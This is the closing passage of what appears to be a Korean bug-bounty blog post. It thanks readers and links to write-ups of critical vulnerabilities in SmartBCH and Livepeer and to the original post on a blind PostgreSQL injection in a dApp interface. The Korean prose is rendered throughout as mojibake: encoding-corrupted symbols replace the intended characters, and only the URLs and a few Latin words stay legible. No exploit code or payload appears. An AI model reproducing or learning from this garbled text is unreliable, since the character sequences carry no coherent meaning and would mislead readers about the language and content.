ì²˜ìŒì´ì§€ë§Œ íŒ€ì› ì¤‘ howdaysêµ°ì´ ì°¾ì•„ë‚¸ Critical ì·¨ì•½ì  ëª‡ê°€ì§€ ë” ì²¨ë¶€í•˜ê³  ëë‚´ê² ìŠµë‹ˆë‹¤. ê¸´ ê¸€ ì½ì–´ì£¼ì…”ì„œ ê°ì‚¬í•©ë‹ˆë‹¤.

Bitcoin Cashì˜ ì‚¬ì´ë“œì²´ì¸ SmartBCHì—ì„œ ë°œê²¬í•œ Critical ì·¨ì•½ì : [https://smartbch.medium.com/a-whitehat-hacker-protects-smartbch-by-reporting-a-vulnerability-d2c8a5d91732](https://smartbch.medium.com/a-whitehat-hacker-protects-smartbch-by-reporting-a-vulnerability-d2c8a5d91732)

Livepeer Networkì—ì„œ ë°œê²¬í•œ Critical ì·¨ì•½ì : [https://forum.livepeer.org/t/post-mortem-8-24-22-delegated-stake-could-be-frozen/1897](https://forum.livepeer.org/t/post-mortem-8-24-22-delegated-stake-could-be-frozen/1897)

ìœ„ì˜ ê²Œì‹œê¸€ë„ ì¬ë°Œìœ¼ë‹ˆ ì½ì–´ì£¼ì‹œë©´ ê°ì‚¬í•˜ê² ìŠµë‹ˆë‹¤ ğŸ™‚

ë³¸ ê¸€ì˜ ì›ë¬¸ì€ [https://blog.munsiwoo.kr/2023/03/blind-postgresql-injection-in-dapp-interface-20000-bounty/](https://blog.munsiwoo.kr/2023/03/blind-postgresql-injection-in-dapp-interface-20000-bounty/) ì—ì„œ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
